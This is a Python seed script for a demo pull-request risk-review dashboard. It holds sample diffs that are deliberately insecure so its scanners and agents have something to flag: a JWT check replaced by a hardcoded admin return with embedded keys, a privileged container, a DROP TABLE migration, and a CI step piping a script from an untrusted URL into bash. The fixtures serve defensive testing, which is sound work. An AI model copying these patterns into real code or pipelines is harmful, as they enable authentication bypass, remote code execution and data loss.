import json
import uuid
from datetime import datetime, timedelta
from .database import get_db, init_db
from .scanners import run_all_scanners
from .risk_engine import compute_risk_score
from .agents import (
    run_release_orchestrator,
    run_security_agent,
    run_infra_agent,
    run_rollback_agent,
    run_cost_agent,
    run_db_agent,
    run_incident_agent
)
from .comment_generator import generate_github_pr_comment

SAMPLE_DIFF_CRITICAL = """diff --git a/backend/auth/jwt_handler.py b/backend/auth/jwt_handler.py
--- a/backend/auth/jwt_handler.py
+++ b/backend/auth/jwt_handler.py
@@ -12,4 +12,8 @@
 def verify_session(token):
-    return jwt.decode(token, os.environ["SECRET_KEY"], algorithms=["HS256"])
+    # Temporarily hardcoding root secret for fast QA testing
+    API_KEY = "AKIAIOSFODNN7EXAMPLE99"
+    IBM_CLOUD_API_KEY = "ibm_cloud_sec_99482710394857201948571"
+    DEBUG = True
+    return {"user": "admin", "role": "superuser"}
diff --git a/k8s/deployment.yaml b/k8s/deployment.yaml
--- a/k8s/deployment.yaml
+++ b/k8s/deployment.yaml
@@ -25,4 +25,7 @@
     spec:
       containers:
       - name: auth-service
+        securityContext:
+          privileged: true
         image: auth-service:latest
"""

SAMPLE_DIFF_HIGH = """diff --git a/db/migrations/20260925_drop_legacy_ledger.sql b/db/migrations/20260925_drop_legacy_ledger.sql
new file mode 100644
--- /dev/null
+++ b/db/migrations/20260925_drop_legacy_ledger.sql
@@ -0,0 +1,5 @@
+-- Destructive cleanup for migration v3.4
+LOCK TABLE transactions IN EXCLUSIVE MODE;
+ALTER TABLE accounts ADD COLUMN tier_id INTEGER NOT NULL;
+DROP TABLE legacy_audit_ledger;
+CREATE INDEX idx_user_billing ON user_billing(account_id);
diff --git a/terraform/database.tf b/terraform/database.tf
--- a/terraform/database.tf
+++ b/terraform/database.tf
@@ -40,3 +40,5 @@
 resource "aws_db_instance" "primary" {
   instance_class = "db.r5.12xlarge"
+  multi_az = true
 }
"""

SAMPLE_DIFF_MEDIUM = """diff --git a/services/payment_gateway.py b/services/payment_gateway.py
--- a/services/payment_gateway.py
+++ b/services/payment_gateway.py
@@ -35,5 +35,6 @@
 def charge_customer(card_token, amount):
-    resp = requests.post("https://payment.stripe.internal/v1/charge", json={"amount": amount}, timeout=(3, 10))
+    # Calling downstream payment gateway
+    resp = requests.post("https://payment.stripe.internal/v1/charge", json={"amount": amount})
     return resp.json()
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
--- a/.github/workflows/deploy.yml
+++ b/.github/workflows/deploy.yml
@@ -18,2 +18,3 @@
     - name: Install dependencies
+      run: curl -sSL https://raw.githubusercontent.com/untrusted/installer.sh | bash
"""

SAMPLE_DIFF_LOW = """diff --git a/docs/README.md b/docs/README.md
--- a/docs/README.md
+++ b/docs/README.md
@@ -10,3 +10,6 @@
 # Core Banking Microservice Documentation
 
+Updated architecture diagram for v4.2 release.
+Added troubleshooting steps for circuit breaker configuration.
+Updated API reference links.
diff --git a/tests/test_healthz.py b/tests/test_healthz.py
--- a/tests/test_healthz.py
+++ b/tests/test_healthz.py
@@ -14,2 +14,7 @@
 def test_health_check_endpoint():
     client = TestClient(app)
+    response = client.get("/healthz")
+    assert response.status_code == 200
+    assert response.json()["status"] == "healthy"
"""

def seed_database():
    init_db()
    conn = get_db()
    cursor = conn.cursor()

    # Ensure the app always boots with demo data when the DB is empty or partially initialized.
    cursor.execute("SELECT COUNT(*) as count FROM repositories")
    repo_count = cursor.fetchone()["count"]
    cursor.execute("SELECT COUNT(*) as count FROM pull_requests")
    pr_count = cursor.fetchone()["count"]

    if repo_count > 0 and pr_count > 0:
        conn.close()
        return

    # Rebuild a clean starter dataset so health checks and dashboard views always show live data.
    cursor.execute("DELETE FROM incidents")
    cursor.execute("DELETE FROM deployments")
    cursor.execute("DELETE FROM pr_comments")
    cursor.execute("DELETE FROM agent_outputs")
    cursor.execute("DELETE FROM findings")
    cursor.execute("DELETE FROM pull_requests")
    cursor.execute("DELETE FROM repositories")

    now = datetime.now()

    # 1. Seed Repositories
    repos = [
        ("repo_core_banking", "core-banking-service", "ops-pilot/core-banking-service", "High-throughput transaction ledger and payment processing engine.", "main"),
        ("repo_auth_platform", "auth-identity-provider", "ops-pilot/auth-identity-provider", "Enterprise OAuth2/OIDC single sign-on and token validation service.", "main"),
        ("repo_infra_cloud", "cloud-infrastructure-iac", "ops-pilot/cloud-infrastructure-iac", "Kubernetes cluster manifests, Terraform modules, and CI/CD pipelines.", "main")
    ]

    for r_id, name, full_name, desc, branch in repos:
        cursor.execute("""
            INSERT INTO repositories (id, name, full_name, description, default_branch, webhook_active, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, 1, ?, ?)
        """, (r_id, name, full_name, desc, branch, (now - timedelta(days=30)).isoformat(), now.isoformat()))

    # 2. Seed Pull Requests
    sample_prs = [
        {
            "id": "pr_142",
            "repo_id": "repo_core_banking",
            "pr_number": 142,
            "title": "feat(payments): Migrate legacy ledger table & upgrade RDS instance",
            "description": "Database schema migration for billing ledger v3.4 and RDS hardware upgrade for Q4 traffic peak.",
            "author": "sarah-architect",
            "source_branch": "feature/ledger-migration",
            "target_branch": "main",
            "diff": SAMPLE_DIFF_HIGH
        },
        {
            "id": "pr_143",
            "repo_id": "repo_auth_platform",
            "pr_number": 143,
            "title": "fix(jwt): Optimize token validation latency & add debug logging",
            "description": "Quick fix to benchmark auth token validation and container permissions for load tests.",
            "author": "alex-dev",
            "source_branch": "patch/jwt-tuning",
            "target_branch": "main",
            "diff": SAMPLE_DIFF_CRITICAL
        },
        {
            "id": "pr_144",
            "repo_id": "repo_core_banking",
            "pr_number": 144,
            "title": "docs(architecture): Update healthz test coverage & system runbook",
            "description": "Documentation updates and added regression tests for the Kubernetes liveness probe.",
            "author": "priya-qa",
            "source_branch": "docs/healthz-update",
            "target_branch": "main",
            "diff": SAMPLE_DIFF_LOW
        },
        {
            "id": "pr_145",
            "repo_id": "repo_core_banking",
            "pr_number": 145,
            "title": "perf(payments): Add external payment gateway integration & script setup",
            "description": "Streamlining Stripe client invocation and automating CI dependency runner.",
            "author": "carlos-eng",
            "source_branch": "feature/stripe-gateway",
            "target_branch": "main",
            "diff": SAMPLE_DIFF_MEDIUM
        }
    ]

    for p in sample_prs:
        findings = run_all_scanners(p["diff"])
        risk = compute_risk_score(findings)

        # Run IBM Bob subagents
        sec_agent = run_security_agent(findings)
        infra_agent = run_infra_agent(findings)
        rollback_agent = run_rollback_agent(p["repo_id"], p["pr_number"], p["source_branch"], findings)
        cost_agent = run_cost_agent(findings)
        db_agent = run_db_agent(findings)
        orchestrator = run_release_orchestrator(
            p["title"],
            p["description"],
            risk,
            findings,
            {"sec": sec_agent, "infra": infra_agent, "rollback": rollback_agent}
        )

        all_agents = [orchestrator, sec_agent, infra_agent, rollback_agent, cost_agent, db_agent]

        # Generate PR comment
        comment_data = generate_github_pr_comment(p["pr_number"], risk, findings, all_agents)

        cursor.execute("""
            INSERT INTO pull_requests (
                id, repo_id, pr_number, title, description, author,
                source_branch, target_branch, status, risk_score, risk_level,
                verdict, comment_posted, diff_content, files_changed_json,
                created_at, updated_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'open', ?, ?, ?, 1, ?, ?, ?, ?)
        """, (
            p["id"], p["repo_id"], p["pr_number"], p["title"], p["description"], p["author"],
            p["source_branch"], p["target_branch"], risk["score"], risk["level"],
            risk["verdict"], p["diff"], json.dumps(["diff.patch"]),
            (now - timedelta(hours=4)).isoformat(), now.isoformat()
        ))

        # Insert findings
        for f in findings:
            cursor.execute("""
                INSERT INTO findings (
                    id, pr_id, scanner_type, severity, title, description,
                    file_path, line_number, snippet, remediation, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                f.get("id", f"find_{uuid.uuid4().hex[:8]}"), p["id"], f["scanner_type"], f["severity"],
                f["title"], f["description"], f.get("file_path"), f.get("line_number", 1),
                f.get("snippet", ""), f.get("remediation", ""), now.isoformat()
            ))

        # Insert agent outputs
        for a in all_agents:
            cursor.execute("""
                INSERT INTO agent_outputs (
                    id, pr_id, agent_name, agent_role, status, summary,
                    verdict, details_json, confidence, created_at
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                a["id"], p["id"], a["agent_name"], a["agent_role"], a["status"],
                a["summary"], a.get("verdict"), json.dumps(a.get("details_json", {})),
                a.get("confidence", 0.95), now.isoformat()
            ))

        # Insert PR comment
        cursor.execute("""
            INSERT INTO pr_comments (
                id, pr_id, comment_body, status_check_state, status_check_description, posted_at
            ) VALUES (?, ?, ?, ?, ?, ?)
        """, (
            f"comment_{p['id']}", p["id"], comment_data["comment_body"],
            comment_data["status_check_state"], comment_data["status_check_description"], now.isoformat()
        ))

    # 3. Seed Deployments (Step 10)
    cursor.execute("""
        INSERT INTO deployments (id, repo_id, pr_id, environment, version, status, deployed_by, deployed_at)
        VALUES ('dep_live_prod', 'repo_core_banking', 'pr_145', 'production', 'v4.2.1-rc1', 'DEPLOYED', 'github-actions[bot]', ?)
    """, ((now - timedelta(minutes=45)).isoformat(),))

    # 4. Seed an Active Incident (Step 11 & 12)
    sample_pr_145 = sample_prs[3]
    incident_agent_res = run_incident_agent(
        "P1 Outage: 504 Gateway Timeout Spike on Checkout API",
        "CRITICAL",
        "504_LATENCY_SPIKE",
        sample_pr_145,
        {"id": "dep_live_prod", "version": "v4.2.1-rc1"}
    )

    cursor.execute("""
        INSERT INTO incidents (
            id, deployment_id, repo_id, correlated_pr_id, title, severity,
            status, telemetry_json, bob_analysis_json, remediation_runbook, created_at
        ) VALUES (
            'inc_9011', 'dep_live_prod', 'repo_core_banking', 'pr_145',
            'P1 Outage: 504 Gateway Timeout Spike on /api/v1/charge', 'CRITICAL',
            'INVESTIGATING', ?, ?, ?, ?
        )
    """, (
        json.dumps({
            "metric": "HTTP 504 Gateway Timeout",
            "error_rate": "18.4%",
            "p99_latency_ms": 12850,
            "region": "us-east-1",
            "impacted_users": 1420
        }),
        json.dumps(incident_agent_res),
        incident_agent_res["details_json"]["emergency_killswitch"],
        (now - timedelta(minutes=15)).isoformat()
    ))

    conn.commit()
    conn.close()

if __name__ == "__main__":
    seed_database()
    print("Database seeded successfully!")
